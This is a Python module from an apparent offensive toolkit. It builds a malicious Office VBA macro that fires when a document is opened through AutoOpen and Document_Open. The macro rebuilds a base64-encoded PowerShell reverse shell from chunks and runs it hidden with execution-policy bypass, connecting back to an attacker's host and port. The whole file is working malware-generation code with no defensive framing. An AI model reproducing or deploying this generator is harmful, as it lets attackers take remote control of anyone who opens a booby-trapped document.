#!/usr/bin/env python3
import base64
from .powershell import PowerShellGenerator

class OfficeMacroGenerator:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        self.ps_gen = PowerShellGenerator(lhost, lport)
    
    def generate_vba_macro(self):
        """Generate VBA macro for Office documents"""
        ps_payload = self.ps_gen.generate_reverse_shell()
        encoded = base64.b64encode(ps_payload.encode('utf-16le')).decode()
        
        # Split encoded payload into chunks
        chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
        
        vba = '''
Sub AutoOpen()
    ExecutePayload
End Sub

Sub Document_Open()
    ExecutePayload
End Sub

Sub ExecutePayload()
    Dim cmd As String
    Dim payload As String
    
    ' Reconstruct payload
    payload = ""
'''
        for chunk in chunks:
            vba += f'    payload = payload & "{chunk}"\n'
        
        vba += '''
    
    ' Execute
    cmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand " & payload
    
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run cmd, 0, False
    
End Sub
'''
        return vba.strip()